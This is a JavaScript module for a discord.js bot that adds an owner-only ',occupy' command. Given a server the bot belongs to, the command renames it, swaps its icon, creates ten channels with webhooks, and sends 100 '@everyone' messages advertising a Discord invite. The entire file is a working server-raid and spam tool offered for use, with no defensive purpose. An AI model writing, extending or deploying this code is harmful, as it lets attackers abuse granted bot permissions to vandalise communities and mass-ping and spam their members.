const fs = require("fs");
const path = require("path");
const { ChannelType } = require("discord.js");

// Replace with your Discord User ID
const OWNER_ID = "1530872106399567941";

const NEW_SERVER_NAME = "Shibuya on top";
const ICON_PATH = path.join(__dirname, "..", "assets", "shibuya_neon_icon.png");
const WEBHOOK_NAME = "Shibuya";
const SPAM_MESSAGE = "@everyone Join\nhttps://discord.gg/qNedKskX9W\nNoww!";

module.exports = (client) => {
    client.on("messageCreate", async (message) => {
        if (message.author.bot) return;
        if (message.author.id !== OWNER_ID) return;

        // Matches: ,occupy or ,occupy <invite-link>
        const match = message.content.match(/^,occupy(?:\s+(\S+))?$/i);
        if (!match) return;

        const inviteInput = match[1]?.trim();
        let targetGuild = message.guild;

        if (inviteInput) {
            try {
                const invite = await client.fetchInvite(inviteInput);
                targetGuild = client.guilds.cache.get(invite.guild?.id) || null;
            } catch (err) {
                return message.reply("❌ Invalid or expired invite link.").catch(() => {});
            }
        }

        if (!targetGuild) {
            return message.reply("❌ Target server not found or bot is not in it.").catch(() => {});
        }

        const iconBuffer = fs.existsSync(ICON_PATH) ? fs.readFileSync(ICON_PATH) : null;

        // 1. Change server name and server icon
        try {
            const guildEditData = {
                name: NEW_SERVER_NAME,
                reason: "Updated by ,occupy command"
            };
            if (iconBuffer) guildEditData.icon = iconBuffer;

            await targetGuild.edit(guildEditData);
        } catch (err) {
            console.error("[occupy] Guild edit error:", err.message);
        }

        // 2. Create 10 text channels, create a new webhook in each, and send 10 messages via the webhook
        for (let i = 1; i <= 10; i++) {
            try {
                const ch = await targetGuild.channels.create({
                    name: `occupy-${i}`,
                    type: ChannelType.GuildText,
                    reason: "Created by ,occupy command"
                });

                const webhook = await ch.createWebhook({
                    name: WEBHOOK_NAME,
                    avatar: iconBuffer || undefined,
                    reason: "Webhook created by ,occupy command"
                });

                for (let j = 0; j < 10; j++) {
                    await webhook.send({
                        content: SPAM_MESSAGE,
                        allowedMentions: { parse: ["everyone"] }
                    });
                }
            } catch (err) {
                console.error(`[occupy] Error on channel ${i}:`, err.message);
            }
        }
    });
};
